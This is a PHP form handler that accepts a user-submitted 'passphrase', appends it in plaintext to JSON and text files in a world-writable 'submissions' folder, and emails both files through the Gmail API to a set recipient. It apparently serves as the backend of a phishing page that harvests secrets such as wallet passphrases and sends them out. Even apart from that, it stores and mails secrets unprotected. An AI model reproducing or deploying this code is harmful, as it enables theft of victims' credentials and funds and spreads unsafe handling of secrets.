<?php
require_once 'vendor/autoload.php';

use Google\Client;
use Google\Service\Gmail;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the submitted passphrase
    $passphrase = trim($_POST['mf-text']);

    // Check if the passphrase is not empty
    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    // Define the file path and name
    $filePath = 'submissions/';
    $jsonFileName = 'passphrases.json';
    $txtFileName = 'passphrases.txt';

    // Create the directory if it doesn't exist
    if (!is_dir($filePath)) {
        mkdir($filePath, 0777, true);
    }

    // Prepare the data to save
    $data = [
        'passphrase' => $passphrase,
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // Save as JSON
    $jsonData = json_encode($data) . PHP_EOL;
    file_put_contents($filePath . $jsonFileName, $jsonData, FILE_APPEND);

    // Save as plain text
    $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
    file_put_contents($filePath . $txtFileName, $textData, FILE_APPEND);

    // Send email with attachments
    try {
        $client = new Client();
        $client->setAuthConfig('path/to/credentials.json');
        $client->addScope(Gmail::MAIL_GOOGLE_COM);

        $service = new Gmail($client);

        $message = new Google_Service_Gmail_Message();
        $boundary = uniqid(rand(), true);
        $subject = 'New Passphrase Submission';
        $rawMessageString = "From: sender@example.com\r\n";
        $rawMessageString .= "To: recipient@example.com\r\n";
        $rawMessageString .= "Subject: $subject\r\n";
        $rawMessageString .= "MIME-Version: 1.0\r\n";
        $rawMessageString .= "Content-Type: multipart/mixed; boundary=\"$boundary\"\r\n\r\n";
        $rawMessageString .= "--$boundary\r\n";
        $rawMessageString .= "Content-Type: text/plain; charset=UTF-8\r\n\r\n";
        $rawMessageString .= "A new passphrase has been submitted.\r\n\r\n";
        $rawMessageString .= "--$boundary\r\n";
        $rawMessageString .= "Content-Type: application/json; name=\"$jsonFileName\"\r\n";
        $rawMessageString .= "Content-Disposition: attachment; filename=\"$jsonFileName\"\r\n";
        $rawMessageString .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $rawMessageString .= chunk_split(base64_encode(file_get_contents($filePath . $jsonFileName))) . "\r\n";
        $rawMessageString .= "--$boundary\r\n";
        $rawMessageString .= "Content-Type: text/plain; name=\"$txtFileName\"\r\n";
        $rawMessageString .= "Content-Disposition: attachment; filename=\"$txtFileName\"\r\n";
        $rawMessageString .= "Content-Transfer-Encoding: base64\r\n\r\n";
        $rawMessageString .= chunk_split(base64_encode(file_get_contents($filePath . $txtFileName))) . "\r\n";
        $rawMessageString .= "--$boundary--";

        $message->setRaw(strtr(base64_encode($rawMessageString), array('+' => '-', '/' => '_', '=' => '')));

        $service->users_messages->send('me', $message);
        echo "Passphrase saved and email sent successfully!";
    } catch (Exception $e) {
        echo 'Error: ' . $e->getMessage();
    }
} else {
    echo "Invalid request method.";
}
?>
